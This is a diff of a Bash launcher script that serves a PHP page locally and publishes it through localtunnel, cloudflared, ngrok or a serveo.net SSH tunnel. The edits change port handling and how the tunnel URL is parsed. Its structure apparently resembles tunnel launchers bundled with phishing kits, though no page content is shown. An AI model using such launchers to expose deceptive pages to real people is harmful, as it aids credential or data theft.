@@ -20,7 +20,7 @@ try_localtunnel() {
 	fi
 
 	pkill -f "localtunnel" 2>/dev/null || true
-	$LT_CMD --port 3333 > localtunnel.log 2>&1 &
+	$LT_CMD --port $PHP_PORT > localtunnel.log 2>&1 &
 	local lt_pid=$!
 
 	local elapsed=0
@@ -50,22 +50,18 @@ try_cloudflared() {
 	fi
 
 	pkill -f "cloudflared" 2>/dev/null || true
-	cloudflared tunnel --url http://127.0.0.1:3333 > cloudflared.log 2>&1 &
+	cloudflared tunnel --url http://127.0.0.1:$PHP_PORT > cloudflared.log 2>&1 &
 	local cf_pid=$!
 
 	local elapsed=0
-	while [[ $elapsed -lt 8 ]]; do
+	while [[ $elapsed -lt 12 ]]; do
 		sleep 1
 		elapsed=$((elapsed+1))
 		# cloudflared prints the public url in logs - look for the actual tunnel URL
 		local url=$(grep -oP 'https://[a-z0-9\-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
 		if [[ -z "$url" ]]; then
-			# Alternative pattern for cloudflared output
-			url=$(grep -oP 'https://[a-z0-9\-]+\.cloudflare\.com' cloudflared.log | grep -v 'www.cloudflare.com' | head -n1 || true)
-		fi
-		if [[ -z "$url" ]]; then
-			# Look for any https URL that's not the main cloudflare site
-			url=$(grep -oP 'https://[a-z0-9\-\.]+' cloudflared.log | grep -v 'www.cloudflare.com' | grep -v 'cloudflare.com/cdn-cgi' | head -n1 || true)
+			# Fallback: match line containing "https://...trycloudflare.com"
+			url=$(grep -o 'https://[^[:space:]]*\.trycloudflare\.com' cloudflared.log | head -n1 || true)
 		fi
 		if [[ -n "$url" ]]; then
 			printf "\e[1;92m[✓] cloudflared ready: $url\e[0m\n"
@@ -594,7 +590,7 @@ try_ngrok() {
 	sleep 1
 	
 	# Start ngrok with explicit logging
-	$NGROK_CMD http 3333 --log=stdout > ngrok.log 2>&1 &
+	$NGROK_CMD http $PHP_PORT --log=stdout > ngrok.log 2>&1 &
 	local ngrok_pid=$!
 	
 	# Monitor for 5 seconds
@@ -667,7 +663,7 @@ try_serveo() {
 	
 	# Start SSH tunnel
 	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ConnectTimeout=5 \
-		-R ${subdomain}:80:127.0.0.1:3333 serveo.net > sendlink 2>&1 &
+		-R ${subdomain}:80:127.0.0.1:$PHP_PORT serveo.net > sendlink 2>&1 &
 	local ssh_pid=$!
 	
 	# Quick polling (3 seconds)
@@ -868,23 +864,33 @@ main() {
 
 	# Setup PHP server with binding for hotspots
 	PHP_BIND="127.0.0.1"
+	PHP_PORT="8080"
 	if $IS_TERMUX || $IS_WINDOWS; then
 		PHP_BIND="0.0.0.0"
 	fi
 
-	printf "\e[1;92m[+] Starting PHP server on $PHP_BIND:3333\e[0m\n"
+	# Try default port 8080 first, fallback to 3333 if needed
+	printf "\e[1;92m[+] Starting PHP server on $PHP_BIND:$PHP_PORT\e[0m\n"
 	
 	# Start PHP server and capture output
-	php -S ${PHP_BIND}:3333 > php.log 2>&1 < /dev/null &
+	php -S ${PHP_BIND}:$PHP_PORT > php.log 2>&1 < /dev/null &
 	local php_pid=$!
 	printf "\e[1;92m[+] PHP PID: $php_pid\e[0m\n"
 	
 	# Quick verify PHP started
+	sleep 1
 	if ! kill -0 $php_pid 2>/dev/null; then
-		printf "\e[1;31m[!] PHP failed to start\e[0m\n"
-		printf "\e[1;93m[DEBUG] php.log:\e[0m\n"
-		cat php.log || true
-		return 1
+		printf "\e[1;93m[!] Port $PHP_PORT failed, trying 3333...\e[0m\n"
+		PHP_PORT="3333"
+		php -S ${PHP_BIND}:$PHP_PORT > php.log 2>&1 < /dev/null &
+		php_pid=$!
+		printf "\e[1;92m[+] PHP PID (retry): $php_pid\e[0m\n"
+		sleep 1
+		if ! kill -0 $php_pid 2>/dev/null; then
+			printf "\e[1;31m[!] PHP failed to start on both ports\e[0m\n"
+			cat php.log
+			return 1
+		fi
 	fi
 	
 	printf "\e[1;92m[✓] PHP server running\e[0m\n"
@@ -892,12 +898,12 @@ main() {
 	printf "\n\e[1;92m[*] Network diagnostics...\e[0m\n"
 	
 	# Check if PHP is actually listening (retry multiple addresses)
-	printf "\e[1;92m[+] Checking PHP on $PHP_BIND:3333...\e[0m\n"
+	printf "\e[1;92m[+] Checking PHP on $PHP_BIND:$PHP_PORT...\e[0m\n"
 	local php_ok=0
 	for host in 127.0.0.1 0.0.0.0; do
 		for try in 1 2 3; do
-			if curl -s --max-time 1 "http://$host:3333/index.php" >/dev/null 2>&1; then
-				printf "\e[1;92m[✓] PHP is responding on $host:3333\e[0m\n"
+			if curl -s --max-time 1 "http://$host:$PHP_PORT/index.php" >/dev/null 2>&1; then
+				printf "\e[1;92m[✓] PHP is responding on $host:$PHP_PORT\e[0m\n"
 				php_ok=1
 				break 2
 			fi
@@ -910,13 +916,13 @@ main() {
 		printf "\n\e[1;31m[!] ERROR: PHP not responding on local interfaces\e[0m\n"
 		printf "\e[1;93m[DEBUG] php.log:\e[0m\n"
 		tail -40 php.log || true
-		printf "\e[1;93m[!] Attempting to restart PHP bound to 0.0.0.0 and retry...\e[0m\n"
+		printf "\n\e[1;93m[!] Attempting to restart PHP bound to 0.0.0.0 and retry...\e[0m\n"
 		pkill -f "php -S" 2>/dev/null || true
-		php -S 0.0.0.0:3333 > php.log 2>&1 < /dev/null &
+		php -S 0.0.0.0:$PHP_PORT > php.log 2>&1 < /dev/null &
 		sleep 1
 		for try in 1 2 3; do
-			if curl -s --max-time 1 "http://0.0.0.0:3333/index.php" >/dev/null 2>&1; then
-				printf "\e[1;92m[✓] PHP is responding after restart on 0.0.0.0:3333\e[0m\n"
+			if curl -s --max-time 1 "http://0.0.0.0:$PHP_PORT/index.php" >/dev/null 2>&1; then
+				printf "\e[1;92m[✓] PHP is responding after restart on 0.0.0.0:$PHP_PORT\e[0m\n"
 				php_ok=1
 				break
 			fi
